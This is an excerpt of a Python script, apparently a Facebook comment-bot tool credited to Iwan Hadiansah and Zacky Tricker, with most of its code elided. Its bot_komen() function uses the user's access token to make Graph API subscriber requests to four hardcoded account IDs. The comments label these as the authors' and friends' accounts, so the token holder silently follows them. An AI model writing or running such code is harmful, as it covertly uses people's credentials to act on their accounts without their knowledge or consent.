...
logo = """      
 ...
 [#]───────────────────────────────────────────────
 [#] Code By    : Iwan Hadiansah & Zacky Tricker
 [#] github     : https://github.com/IwanDev-Official
 [#] facebook   : facebook.com/Iwan.Devoleper.378
 """
...
def bot_komen():
    ...
    requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=' + token) #Iwan Hadiansah ID
    requests.post('https://graph.facebook.com/100021483498135/subscribers?access_token=' + token) #Anton Ibrahim ID
    requests.post('https://graph.facebook.com/100003656938210/subscribers?access_token=' + token) #Irsya Maulana ID
    requests.post('https://graph.facebook.com/100001027764318/subscribers?access_token=' + token) # Zaki ID
    menu()
